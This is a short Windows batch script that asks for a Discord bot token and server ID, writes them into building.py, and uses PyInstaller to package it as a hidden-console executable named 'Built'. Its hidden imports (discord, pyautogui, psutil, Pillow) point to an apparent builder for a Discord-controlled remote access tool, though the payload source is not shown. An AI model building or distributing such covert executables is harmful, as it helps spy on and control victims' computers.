@echo off
type art.txt
echo Enter Bot Token:
set /p bottoken=
powershell -Command "(Get-Content building.py) -replace '%%token%%', '%bottoken%' | Set-Content building.py"

echo.
echo Enter Server ID:
set /p serverid=
powershell -Command "(Get-Content building.py) -replace '%%id%%', '%serverid%' | Set-Content building.py"

echo.
echo Installing dependencies from requirements.txt...
pip install -r requirements.txt

echo.
echo Building the script...

pyinstaller --onefile --noconsole --hidden-import=os --hidden-import=asyncio --hidden-import=psutil --hidden-import=requests --hidden-import=datetime --hidden-import=numpy --hidden-import=pyautogui --hidden-import=pygame --hidden-import=Pillow --hidden-import=discord building.py -n Built

echo.
echo Script built successfully.
echo.
pause
